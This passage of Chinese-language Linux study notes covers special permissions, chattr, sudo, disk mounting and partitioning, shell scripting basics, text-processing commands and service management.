<li> 普通用户必须对此目录拥有r和x权限才能进入此目录</li>
<li>普通用户在此有效组会变成此目录的属组</li>
<li>如果普通用户对此组有w权限，那么新建的文件默认属组是这个目录的属组</li>
</ul>
<p>设定方法与sgid类似，2表示sgid或者g+s</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  chmod 2755 文件名 #2表示sgid</span><br><span class="line">  chmod g+s 文件名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">删除sgid方法</span></span><br><span class="line">chmod 755 文件名</span><br><span class="line">chmod g-s 文件名</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<ul>
<li>sbit（sticky bit）</li>
</ul>
<p>粘着位</p>
<p>作用：user1创建的文件，user2没法修改和删除</p>
<p>前提：</p>
<ul>
<li><p>只对目录有效</p>
</li>
<li><p>普通话用户对该目录拥有wx权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 1755 目录名 #1表示sbit</span><br><span class="line">chmod o+t 目录名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">删除sbit方法</span></span><br><span class="line">chmod 777 目录名</span><br><span class="line">chmod o-t 目录名</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="文件系统属性chattr权限"><a href="#文件系统属性chattr权限" class="headerlink" title="文件系统属性chattr权限"></a>文件系统属性chattr权限</h4><p>change atrribute</p>
<p>查看文件系统属性<code>lsattr -a 文件或目录</code></p>
<p>a：显示所有文件和目录</p>
<p>d：目标是目录，仅列出目录本身的属性而不是子文件</p>
<p>针对root用户也生效</p>
<p><code>chattr [+-=] [选项][文件或目录]</code></p>
<p>i：如果对文件设置i，相当于只读；如果是目录，仅能对已存在文件内容进行修改</p>
<p>a：对于文件，只能在文件中写入新的数据（只能用ehco方式追加），不能删除和修改；对于目录允许新建和修改文件但是不允许删除</p>
<h4 id="sudo权限"><a href="#sudo权限" class="headerlink" title="sudo权限"></a>sudo权限</h4><p>root把本来只有超级用户执行的命令赋予普通用户执行</p>
<p>sudo的操作对象是系统命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">visudo 或者 vim /etc/sudoers</span><br><span class="line">root all=(all) all</span><br><span class="line"><span class="meta">#</span><span class="bash"> 用户名   被管理主机地址 = （可使用的身份） 授权命令（绝对路径）</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="分区命令"><a href="#分区命令" class="headerlink" title="分区命令"></a>分区命令</h2><h4 id="查看分区信息disk-free"><a href="#查看分区信息disk-free" class="headerlink" title="查看分区信息disk free"></a>查看分区信息disk free</h4><p>​    df [option] [file name]</p>
<p>​        -a显示所有的文件系统信息</p>
<p>​        -h 使用习惯单位显示容量</p>
<h4 id="显示目录和文件的大小data-usage"><a href="#显示目录和文件的大小data-usage" class="headerlink" title="显示目录和文件的大小data usage"></a>显示目录和文件的大小data usage</h4><p>​    du [option] [file name]</p>
<p>​        -a 显示每个子文件的磁盘占用量</p>
<p>​        -h 以习惯的单位显示磁盘占用</p>
<p>​        -s 统计占用量,不列出子目录和子文件占用量</p>
<h4 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h4><p>mount [-l] 显示已经挂载的设备,-l 会显示卷标名称</p>
<p>mount -a 根据/etc/fstab 的内容,自动挂载</p>
<p><strong>mount</strong> [-t 文件系统 ]  [-L 卷标名] [-o 特殊选项] <strong>设备文件名</strong>     <strong>挂载点</strong></p>
<p>光盘的文件系统是iso9660</p>
<p>特殊选项:</p>
<p>remount 重新挂载</p>
<p>exec/noexec 允许执行可执行文件或者禁止</p>
<h5 id="挂载光盘"><a href="#挂载光盘" class="headerlink" title="挂载光盘"></a>挂载光盘</h5><p>mount /dev/cdrom /mnt/cdrom/</p>
<p>第一个参数是系统默认的即为光盘的设备文件名也可以是sr0</p>
<p>第二个参数是挂载点,当前命令挂载在/mnt/cdrom/文件夹下</p>
<h5 id="挂载u盘"><a href="#挂载u盘" class="headerlink" title="挂载u盘"></a>挂载u盘</h5><ul>
<li>首先需要查询upan设备文件名</li>
</ul>
<p><code>fdisk -l</code> 找到u盘的设备文件名</p>
<ul>
<li><strong>mount</strong> [-t 文件系统 ]  [-L 卷标名] [-o 特殊选项] <strong>设备文件名</strong>     <strong>挂载点</strong></li>
</ul>
<p>设备文件名是刚刚upan的设备文件名,挂载点随意,linux系统建议mnt下</p>
<h4 id="卸载设备"><a href="#卸载设备" class="headerlink" title="卸载设备"></a>卸载设备</h4><p>umount <strong>设备文件名 / 挂载点</strong></p>
<h3 id="fdisk进行分区"><a href="#fdisk进行分区" class="headerlink" title="fdisk进行分区"></a>fdisk进行分区</h3><p>先<strong>拓展分区</strong>再<strong>逻辑分区</strong>最后<strong>挂载分区</strong></p>
<p> sdb1,2,3,4 为只能给主分区或者拓展分区,而不能给逻辑分区</p>
<p>5开始为拓展分区,拓展分区的作用是在拓展分区内建立更多的分区</p>
<ul>
<li>fdisk -l 查询新硬盘信息</li>
<li>fdisk /dev/sdb(a) 使用(进入一个linux自带的分区程序,根据提示完成分区)</li>
<li>partprobe 重新读取分区表信息</li>
<li><code>mkfs - t ext4 [刚刚创建的分区]</code>     格式化已创建的分区,只能格式化逻辑分区和主分区,不能格式化拓展分区,格式化之后才可以挂载</li>
<li>使用mount 挂载</li>
</ul>
<h3 id="自动挂载和fstab文件修复"><a href="#自动挂载和fstab文件修复" class="headerlink" title="自动挂载和fstab文件修复"></a>自动挂载和fstab文件修复</h3><ul>
<li>fstab文件修复仅出现在centos7以下的系统</li>
</ul>
<p>自动挂载实现形式: 修改/etc/fstab文件内容</p>
<ul>
<li>第一个字段,分区设备文件名或者uuid</li>
<li>第二字段:挂载点</li>
<li>第三字段:文件系统名</li>
<li>第四字段:挂载参数</li>
<li>第五字段:系统是否定期备份,0表示不备份,1表示每天备份,2表示不定期备份</li>
<li>第六字段指定分区是否被fsck检测,0表示不检测,其他数字代表检测的优先级高,1&gt;2</li>
</ul>
<p>修改完成后进行操作mount -a,</p>
<p>该命令根据fstab文件自动挂载分区,开机自动挂载</p>
<p>如果是centos 7以下 的系统,如果修改错误fstab文件会导致系统异常无法启动,根据命令输入root密码进入提示符界面</p>
<p>首先要给文件mount –o remount,rw /重新挂载该文件为读写,就可以进入/etc/fstab中修改</p>
<h4 id="分配swap分区"><a href="#分配swap分区" class="headerlink" title="分配swap分区"></a>分配swap分区</h4><ul>
<li>查询内存和swap分区占用情况  free</li>
<li>新建swap分区 fdisk /dev/sdb,并且将id改为82</li>
<li>swap分区特有的格式化命令 mkswap /dev/sdb6</li>
<li>加入swap分区 swapon /dev/sdb6,取消用是swapoff</li>
<li>最后加入/etc/fstab开机自动挂载</li>
</ul>
<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>使Linux系统可以识别出该文件是个shell脚本方法，在文件的开头添加：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>的声明，<strong>该#不是注释内容而是声明</strong></p>
<ul>
<li><p>echo</p>
<p>-e 支持转义符号\</p>
<p>“ “,引起的内容输出</p>
<p>执行shell脚本：</p>
<ol>
<li>赋予执行权限直接运行：<code>chmod 755 hello.sh</code> or  <code>./hello.sh</code>   </li>
<li>通过调用bash执行脚本 <code>bash hello.sh</code></li>
</ol>
</li>
</ul>
<p>遇到无法执行的shell脚本，因为该脚本是在windows环境下写成的，回车符是<code>M$</code>而Linux是<code>$</code>,需要用dos2unix命令转换脚本回车识别符使Linux支持，该命令可以用在线包管理获取；</p>
<ul>
<li>history</li>
</ul>
<p>-c 清空历史命令</p>
<p>-w 把缓存的历史命令写入历史命令保存文件</p>
<p>~./bash_history</p>
<p>默认保存1000条，可以从/etc/profile中修改环境变量配置文件</p>
<ul>
<li>自动补全，如果唯一，一下tab，两个以上，两下tab把有的都列出来</li>
<li>命令别名</li>
</ul>
<p>alias 别名=‘命令’</p>
<p><strong>等号两边不能有空格</strong></p>
<p>让别名永久生效，修改文件vi /root/.bashrc</p>
<p>删除别名 unalias 别名</p>
<ul>
<li>快捷键</li>
</ul>
<p>ctrl+c 终止当前命令</p>
<p>ctrl+l 相当于clear</p>
<p>ctrl+u 删除/剪切 一行已经输入的命令</p>
<p>ctrl+y 粘贴剪切的命令</p>
<p>ctrl+r 搜索命令</p>
<p>ctrl+d 退出当前终端</p>
<ul>
<li><p>标准输入输出</p>
<table>
<thead>
<tr>
<th>设备</th>
<th>设备文件名</th>
<th>文件描述符</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td>键盘</td>
<td>/dev/stdin</td>
<td>0</td>
<td>标准输入</td>
</tr>
<tr>
<td>显示器</td>
<td>/dev/stdout</td>
<td>1</td>
<td>标准输出</td>
</tr>
<tr>
<td>显示器</td>
<td>/dev/stderr</td>
<td>2</td>
<td>标准错误输出</td>
</tr>
</tbody></table>
</li>
<li><p>输出重定向</p>
</li>
</ul>
<p>把原本应该输出到屏幕的信息，写到文件，称为重定向</p>
<p><code>命令&gt;文件</code> 覆盖  </p>
<p><code>命令&gt;&gt;文件</code>追加</p>
<p><code>命令 2&gt; 文件</code> &amp; <code>命令 2&gt;&gt; 文件</code> 错误输出重定向</p>
<h3 id="错误正确都可以写入"><a href="#错误正确都可以写入" class="headerlink" title="错误正确都可以写入"></a>错误正确都可以写入</h3><p><code>命令 &gt;&gt; 文件 2&gt;&amp;1 </code>   追加     </p>
<p><code>命令 &gt; 文件 2&gt;&amp;1</code>    覆盖 /dev/null 文件黑洞，不会</p>
<p>/dev/null 文件黑洞，不会输出任何结果</p>
<p># 把正确的和错误的分开保存</p>
<p><code>命令&gt;&gt;log1 2&gt;&gt;log2</code> 把正确的命令结果输入到log1，把错误的命令结果输出到log2</p>
<ul>
<li>输入重定向</li>
</ul>
<p>wc -c统计字节数   -w统计单词数  -l统计行数</p>
<p>从文件输入命令</p>
<p>wc &lt; 文件</p>
<h4 id="多命令顺序执行和管道符"><a href="#多命令顺序执行和管道符" class="headerlink" title="多命令顺序执行和管道符"></a>多命令顺序执行和管道符</h4><table>
<thead>
<tr>
<th>字符</th>
<th>格式</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>;</td>
<td>命令1 ;命令2</td>
<td>没有逻辑联系,第一条命令执行完执行第二条</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>命令1&amp;&amp;命令2</td>
<td>与关系，命令1正确执行命令2，反之都不执行</td>
</tr>
<tr>
<td>||</td>
<td>命令1||命令2</td>
<td>或关系，命令1正确不执行2，1不正确执行2</td>
</tr>
</tbody></table>
<ul>
<li>管道符</li>
</ul>
<p>命令1 |命令2</p>
<p>命令1的正确输出作为命令2的操作对象</p>
<p>例如： <code>ll -a /etc/ | more</code> more本来是分页显示文件内的内容，用管道符链接可以将命令的结果分页显示</p>
<ul>
<li><p>grep -i忽略大小写 -n输出行号 -v反向查找 –color=auto自动显示颜色</p>
<p>grep 搜索内容 文件名</p>
<p>grep也是对文件进行操作，结合管道符可以对命令的输出进行操作</p>
</li>
<li><p><code>netstat -an | grep &quot;ESTABLISHED&quot;</code>列出网络服务中已经建立连接的</p>
</li>
<li><pre><code> 通配符
</code></pre>
</li>
</ul>
<p>？ 代表一个任意字符</p>
<p><code>*</code>  代表0个或者多个</p>
<p>[]  匹配内容中任意一个字符</p>
<p>[-]  -表示一个范围，a-z就是匹配一个小写字母</p>
<p>[^] 逻辑非</p>
<h4 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h4><ul>
<li>自定义变量（本地变量）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">log =&quot;money&quot;</span><br><span class="line">echo $log</span><br><span class="line">set #显示所有的变量</span><br></pre></td></tr></table></figure>

<p>和py相同，shell中也不需要对变量进行定义，输出变量是需要加上<code>$</code>符号</p>
<p><strong>变量名和等号之间不能有空格</strong></p>
<p>单引号以字符串的形式输出，双引号输出变量的内容</p>
<p>$（） 小括号中的字符串会当作系统命令</p>
<p>可以用转义\符号忽略$符号的特殊意义，利用花括号来限定一个变量的开始和结束比如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">log = &quot;money&quot;</span><br><span class="line">echo&quot;i have lots of $&#123;log&#125;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>环境变量</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export 变量名 = 变量值 #定义环境变量</span><br><span class="line">env #查询环境变量命令</span><br><span class="line">unset 变量名 #删除环境变量</span><br></pre></td></tr></table></figure>

<p>PATH 系统查看命令路径的地址，用冒号分割</p>
<p>将自己写的脚本放入环境变量推荐用变量叠加<code>PATH = &quot;$PATH&quot;:/脚本存放目录</code></p>
<p>PS1 定义系统提示符变量，需要改时再查</p>
<ul>
<li>位置变量</li>
</ul>
<p>位置参数变量的变量名称是固定的</p>
<table>
<thead>
<tr>
<th>位置参数变量</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>$n</td>
<td>n表示数字，$0表示命令本身，$1-$9表示第一个到第九个参数，10以上的需要用大括号包含如${10}</td>
</tr>
<tr>
<td>$*</td>
<td>包含所有参数的列表，看作一个整体</td>
</tr>
<tr>
<td>$@</td>
<td>包含所有参数的而列表,但把每个参数区分对待</td>
</tr>
<tr>
<td>$#</td>
<td>包含所有参数的个数</td>
</tr>
</tbody></table>
<p>位置参数一般跟在shell脚本的后面<code>bash test.sh 参数1 参数2 参数3</code></p>
<p>位置变量用于传递参数，可以类比成一个内建的数组。</p>
<p>$1保存的是第一个参数，$2保存的是第二个参数…以此类推（比如cp有两个参数，第一个参数保存在$1）</p>
<p>$0用于保存该脚本的名字</p>
<ul>
<li>预定义变量</li>
</ul>
<table>
<thead>
<tr>
<th>预定义变量</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>$？</td>
<td>最后一次执行命令返回状态。返回值为0表示命令正确执行，返回非0即为报错</td>
</tr>
<tr>
<td>$$</td>
<td>当前系统的进程号(pid)</td>
</tr>
<tr>
<td>$！</td>
<td>后台运行的最后一个进程号</td>
</tr>
</tbody></table>
<h3 id="接收键盘输入"><a href="#接收键盘输入" class="headerlink" title="接收键盘输入"></a>接收键盘输入</h3><p><code>read [选项] [变量名]</code></p>
<p>-p 提示信息</p>
<p>-t 秒数</p>
<p>-n 字符数，接受到n个字符之后直接执行不用回车</p>
<p>-s 隐藏输入数据</p>
<h3 id="数值运算和运算符"><a href="#数值运算和运算符" class="headerlink" title="数值运算和运算符"></a>数值运算和运算符</h3><p><code>declare [+/-] [选项]变量名</code></p>
<p><code>-</code> 给变量设定烈性数据</p>
<p><code>+</code> 取消类型属性</p>
<p>-i 设定变量为整型</p>
<p>-x 将变量声明为环境变量</p>
<p>-p 显示指定的变量为被声明的类型</p>
<ul>
<li>expr和let数值运算工具</li>
</ul>
<p> $(expr $a + $b)</p>
<h3 id="变量测试和内容替换"><a href="#变量测试和内容替换" class="headerlink" title="变量测试和内容替换"></a>变量测试和内容替换</h3><p>作用：通过x的值来判断y是否有值</p>
<p>用到再查</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/%E5%8F%98%E9%87%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%86%85%E5%AE%B9%E6%9B%BF%E6%8D%A2.jpg" alt="变量测试和内容替换"></p>
<h4 id="数值运算-运算式-或者-运算式-（常用）"><a href="#数值运算-运算式-或者-运算式-（常用）" class="headerlink" title="数值运算 **$((运算式)) 或者$[运算式]**（常用）"></a>数值运算 **$((运算式)) 或者$[运算式]**（常用）</h4><p>两个小括号或者一个中括号就可以进行数值运算</p>
<h3 id="判断用户的参数-条件判断"><a href="#判断用户的参数-条件判断" class="headerlink" title="判断用户的参数(条件判断)"></a>判断用户的参数(条件判断)</h3><p>测试语句：<code>[ ]</code>,一个中括号两边都要有一个空格</p>
<table>
<thead>
<tr>
<th>操作符号</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-d</td>
<td>文件是否为目录类型</td>
</tr>
<tr>
<td>-e</td>
<td>文件是否存在</td>
</tr>
<tr>
<td>-f</td>
<td>是否为一般文件</td>
</tr>
<tr>
<td>-r</td>
<td>是否有权限读取</td>
</tr>
<tr>
<td>-w</td>
<td>是否有权限写</td>
</tr>
<tr>
<td>-x</td>
<td>是否有权限执行</td>
</tr>
</tbody></table>
<p><strong>注意：返回值为0表示真，1表示假</strong></p>
<p>[ -d /etc ] &amp;&amp; echo”yes” || echo “no”</p>
<p><code>$?</code>可以测试上条测试语句的执行的返回值</p>
<ul>
<li>文件比较</li>
</ul>
<p><code>file1 -nt file2</code> 文件1是否比文件2新,new than</p>
<p><code>file1 -ol file2</code>文件1是否比文件2旧</p>
<p><code>file1 -ef file2</code> 是否为同一个文件,比如判断两个文件是否是硬连接</p>
<ul>
<li>整数之间比较</li>
</ul>
<p>-eq  equal</p>
<p>-ne not equal</p>
<p>-gt great than</p>
<p>-lt low than</p>
<p>-ge great eauql</p>
<p>-le low equal</p>
<ul>
<li>字符串判断</li>
</ul>
<p>-z 字符串 是否为空(空true)</p>
<p>-n 字符串     是否为空(非空 ture)</p>
<p>字符串1 == 字符串2</p>
<p>字符串1 != 字符串2</p>
<ul>
<li>多重条件判断</li>
</ul>
<p><code>判断1 -a 判断2</code> 逻辑与,and</p>
<p><code>判断1 -o 判断2</code> 逻辑或,or</p>
<p><code>! 判断,</code>取反</p>
<h3 id="环境变量-1"><a href="#环境变量-1" class="headerlink" title="环境变量"></a>环境变量</h3><p>让当前的配置文件生效，不用重启</p>
<p><code>source 配置文件</code> 或者`. 配置文件</p>
<ul>
<li>环境变量配置文件</li>
</ul>
<p>PATH        HISSIZE                 PS1                HOSTNAME</p>
<ul>
<li>环境变量配置文件存放位置</li>
</ul>
<p>etc目录下任何用户都会生效</p>
<p><code>/etc/profile</code></p>
<p><code>/etc/profile.d/*.sh</code></p>
<p><code>~/.bash_profile</code>  此条和下一条是登录用户的家目录只有当前登录用户和root可以执行和查看</p>
<p><code>~/.bashrc</code></p>
<p><code>/etc/bashrc</code></p>
<ul>
<li><p>其他环境变量</p>
<ul>
<li><p>注销时生效的环境变量配置文件</p>
<p><code>~/.bash_logout</code></p>
</li>
<li><p>历史命令配置文件</p>
<p><code>~/.bash_history</code></p>
</li>
<li><p>本地终端登录信息/etc/issue</p>
</li>
<li><p>远程登录信息/etc/issue.net</p>
</li>
<li><p>登录后信息/etc/motd</p>
</li>
</ul>
</li>
</ul>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><ul>
<li>通配符是用来匹配符合条件的文件名，通配符是完全匹配；正则匹配的是文件中的匹配符合条件的字符串，是包含匹配</li>
</ul>
<h4 id="基础正则表达式"><a href="#基础正则表达式" class="headerlink" title="基础正则表达式"></a>基础正则表达式</h4><table>
<thead>
<tr>
<th>元字符</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>前一个字符匹配0次或者仍以多次</td>
</tr>
<tr>
<td>.</td>
<td>匹配除了换行符外的任意一个字符</td>
</tr>
<tr>
<td>^</td>
<td>匹配行首.例如^hello会匹配以hello开头的行</td>
</tr>
<tr>
<td>$</td>
<td>匹配行尾</td>
</tr>
<tr>
<td>[]</td>
<td>匹配括号中指定的任意一个字符,只匹配一个字符</td>
</tr>
<tr>
<td>[^]</td>
<td>取反</td>
</tr>
<tr>
<td>\</td>
<td>转义</td>
</tr>
<tr>
<td><code>\&#123;n\&#125;</code></td>
<td>前面出现的字符恰好出现n次(这里\是转义,取消{}}特殊含义)</td>
</tr>
<tr>
<td><code>\&#123;n,\&#125;</code></td>
<td>表示前面的字符出现不小于n次</td>
</tr>
<tr>
<td><code>\&#123;n,m\&#125;</code></td>
<td>表示前面的字符至少出现n次至多出现m次</td>
</tr>
</tbody></table>
<p><code>grep &quot;正则表达式&quot; 文件名</code></p>
<h3 id="字符串截取命令"><a href="#字符串截取命令" class="headerlink" title="字符串截取命令"></a>字符串截取命令</h3><h4 id="cut-字符截取命令"><a href="#cut-字符截取命令" class="headerlink" title="cut 字符截取命令"></a>cut 字符截取命令</h4><ul>
<li>(只能适用于tab进行分割或者指定的符号进行分割情况比如”:”用-d指定)</li>
</ul>
<p><code>cut [option] 文件</code></p>
<p>-f 列号     提取第几列 </p>
<p>-d 分隔符 按照指定的分隔符分割列</p>
<p>比如:test.txt文件中有ab!cd的数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cut -d &quot;!&quot; -f 1#输出ab</span><br><span class="line">cut -d &quot;!&quot; -f 2#输出cd</span><br></pre></td></tr></table></figure>



<h4 id="printf-命令"><a href="#printf-命令" class="headerlink" title="printf 命令"></a>printf 命令</h4><p><code>printf &#39;输出类型输出格式&#39; 输出内容</code></p>
<p>输出内容:</p>
<p>%ns :输出字符串.n是表示几个字符</p>
<p>%ni:输出整数,n表哦是几个数字</p>
<p>%m.nf 输出浮点数,m表示总共输出几个位,n表示小数位数</p>
<p>输出格式:</p>
<p>  \n 换行</p>
<p>\t 制表</p>
<p>\r 回车</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf &#x27;%s&#x27; test.txt # out:&quot;test.txt&quot;</span><br><span class="line">cat test.txt | printf &#x27;%s&#x27; #没有输出</span><br><span class="line">printf &#x27;%s&#x27; $(cat student.txt) #只有这种括号里系统命令的方式才可</span><br></pre></td></tr></table></figure>



<h4 id="awk-命令"><a href="#awk-命令" class="headerlink" title="awk 命令"></a>awk 命令</h4><p><code>awk &#39;条件1 &#123;动作1&#125; 条件2&#123;动作2&#125;...&#39; 文件名</code></p>
<p>BEGIN{print “test!”} #会在所有的执行之前完成</p>
<p>END    #在所有命令执行之后再执行</p>
<p>{FS=”:”} #指定分隔符</p>
<p>动作:</p>
<ol>
<li>流程控制</li>
<li>格式化输出</li>
</ol>
<p>举例:输出非规则数量空格的命令截取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">df -h | awk &#x27;&#123;print $1 &quot;\t&quot; $5&#125;&#x27; #输出系统容量占用的第一列和第五列</span><br></pre></td></tr></table></figure>



<h4 id="sed-命令"><a href="#sed-命令" class="headerlink" title="sed 命令"></a>sed 命令</h4><p>sed命令也是一个文本编辑器,和vim一样,但是vim只能修改文本,不能修改命令输出</p>
<p><code>sed [option] &#39;[动作]&#39; 文件名</code></p>
<p>-n     加了-n会只将sed命令处理的结果输出到屏幕</p>
<p>-e 允许对输出应用多条sed命令编辑</p>
<p>-i 用sed的修改结果直接修改读取数据的文件,而不是由屏幕输出</p>
<p>动作:</p>
<p>a : 追加,添加一行或者多行,添加多行时要加\表示数据未完结,2a表示第二行之后插入</p>
<p>c : 行替换,用c之后的字符替换原数据行,替换多行时要加\表示数据未完结</p>
<p>i :插入,再当前行前插入一行或者多行,插入多行时结尾要加\表示数据未完结,2i在第二行之前插入</p>
<p>d :删除指定行,2,4d的意思为删除2-4行</p>
<p>p:打印输出指定行,2p第二行</p>
<p>s:字符替换,用一个字符替换另一个字符串    <code>行范围s/旧字符串/新字符串/g</code></p>
<h3 id="字符处理命令"><a href="#字符处理命令" class="headerlink" title="字符处理命令"></a>字符处理命令</h3><h4 id="排序命令"><a href="#排序命令" class="headerlink" title="排序命令"></a>排序命令</h4><p><code>sort [option] 文件名</code></p>
<p>默认按照字母顺序排序</p>
<p>-f :忽略大小写</p>
<p>-n : 以数值型进行排序</p>
<p>-r :反向排序</p>
<p>-t :指定分割符,默认是制表符</p>
<p>-k n[,m] : 按照指定的字段范围排序,从n个字段开始,m个字段结束,默认到行尾</p>
<h4 id="统计命令"><a href="#统计命令" class="headerlink" title="统计命令"></a>统计命令</h4><p><code>wc [option] 文件</code></p>
<p>-l 只统计行数</p>
<p>-w 只统计单词数</p>
<p>-m 只统计字符数</p>
<h3 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h3><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if test-commands #test-commands就是条件判断式用[]括起来的测试语句</span><br><span class="line">then </span><br><span class="line">	commands</span><br><span class="line">fi </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">多分支的<span class="keyword">if</span>语句</span></span><br><span class="line">if test-commands-1</span><br><span class="line">	then </span><br><span class="line">	commands-1</span><br><span class="line">elif test-commands-2</span><br><span class="line">	then</span><br><span class="line">	commands-2</span><br><span class="line">	...</span><br><span class="line">else</span><br><span class="line">	commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>值得注意的是，if语句中的条件判断不是以1为真执行的，而是判断块相当于一个函数，该函数的返回值如果为0，则if条件成立，如果不为0，则条件不成立，为假。同样的判断语句块不仅在此成立，while和until中同样适用。</p>
<h4 id="case"><a href="#case" class="headerlink" title="case"></a>case</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case word in </span><br><span class="line">	pattern-1)</span><br><span class="line">		commands-1</span><br><span class="line">		;;</span><br><span class="line">	pattern-2)</span><br><span class="line">		commands-2</span><br><span class="line">		;;</span><br><span class="line">	...</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<p>;;符号相当于break语句</p>
<h4 id="while-amp-until"><a href="#while-amp-until" class="headerlink" title="while &amp; until"></a>while &amp; until</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">while test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">until test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>while和until的区别在于，while是语句块成真（返回值为0）时做do，而until时当语句块为假（返回值为1）时做do</p>
<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for variable in list #这个list可以是单独的文件比如1.txt 2.txt也可以是cat test.txt然后文件中有空格或者tab分割相当于py中的列表  </span><br><span class="line">do </span><br><span class="line">	commands</span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者常规编程语言的习惯</span></span><br><span class="line">for(( i=1;i&lt;=100;i++ ))</span><br></pre></td></tr></table></figure>

<h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function funname()</span><br><span class="line">&#123;</span><br><span class="line">    return int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>例如<code>a=(1 2 3 4 5)</code></p>
<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>服务分类:</p>
<ol>
<li>rpm包默认安装的服务(独立的服务,基于xinetd的服务)</li>
<li>源码包安装的服务</li>
</ol>
<p>xinetd后台管理一系列独立的服务,用户只能通过访问xinetd的服务间接访问后台管理的服务</p>
<p>而独立的服务就是直接可以在内存中被访问到而不需要经过xinetd</p>
<p>查询rpm已经安装的服务:</p>
<p>chkconfig –list  #查看自启动查看命令rpm  # unbuntu下使用sysv-rc-conf工具</p>
<ul>
<li>ps aux</li>
<li>netstat -tlun</li>
</ul>
<p>查看源码包安装的位置:一般是/usr/local</p>
<h3 id="rpm包安装的服务"><a href="#rpm包安装的服务" class="headerlink" title="rpm包安装的服务"></a>rpm包安装的服务</h3><ul>
<li>rpm包服务产生的数据:<code>/var/lib/</code></li>
<li>rpm包服务产生的日志:<code>/var/log/</code></li>
</ul>
<h4 id="rpm包独立服务的管理"><a href="#rpm包独立服务的管理" class="headerlink" title="rpm包独立服务的管理"></a>rpm包独立服务的管理</h4><p>启动脚本的位置:<code>/etc/init.d/</code></p>
<p>初始化配置文件:<code>/etc/sysconfig/</code></p>
<p>启动命令:<code>/etc/init.d/服务名 start|stop|status|restart</code>  或者<code>service 服务名 start|stop|status|restart</code></p>
<p>查看所有服务安装的状态:<code>service --status-all</code></p>
<p>修改<em><strong>自启动</strong></em>*方法:</p>
<ul>
<li><strong>修改/etc/rc.local文件:往文件中加入 标准的绝对路径启动命令,就会开启自启动服务</strong>(适用于源码包安装和rpm包安装的服务)<ul>
<li>/etc/rc.local 的作用是在开机之后用户输入密码之前运行的脚本</li>
</ul>
</li>
<li>ntsysv命令启动管理自启动,类似setup. (ubuntu中用sysv-rc-conf替代)</li>
</ul>
<h4 id="rpm包基于xinetd服务的管理"><a href="#rpm包基于xinetd服务的管理" class="headerlink" title="rpm包基于xinetd服务的管理"></a>rpm包基于xinetd服务的管理</h4><p>启动脚本的位置:<code>/etc/xinetd.d/</code></p>
<p>xinetd配置文件:<code>/etc/xinetd.conf</code></p>
<p>xinetd服务的启动:</p>
<p>修改<code>/etc/xinetd.d/服务名</code>中的disable来启动服务,修改完配置文件后需要重启xinetd的服务,service xinetd restart</p>
<ul>
<li>xinetd中启动和自启动没区别,更改了配置文件启动后,自动开机启动.</li>
</ul>
<h3 id="源码包安装服务"><a href="#源码包安装服务" class="headerlink" title="源码包安装服务"></a>源码包安装服务</h3><ul>
<li>启动</li>
</ul>
<p>在源码包中找到安装说明打开,找到启动的绝对路径,终端输入回车,即<code>绝对路径 start|stop|status|restart</code></p>
<ul>
<li>自启动</li>
</ul>
<p>在源码包中找到安装说明打开,找到启动的绝对路径就可以,写入/etc/rc.local文件中</p>
<ul>
<li>让源码包服务可以被服务管理命令识别(service 服务名)</li>
</ul>
<p>只需要做一个软连接</p>
<p><code>ln  -s  启动命令 /etc/init.d/自定义一个服务名</code></p>
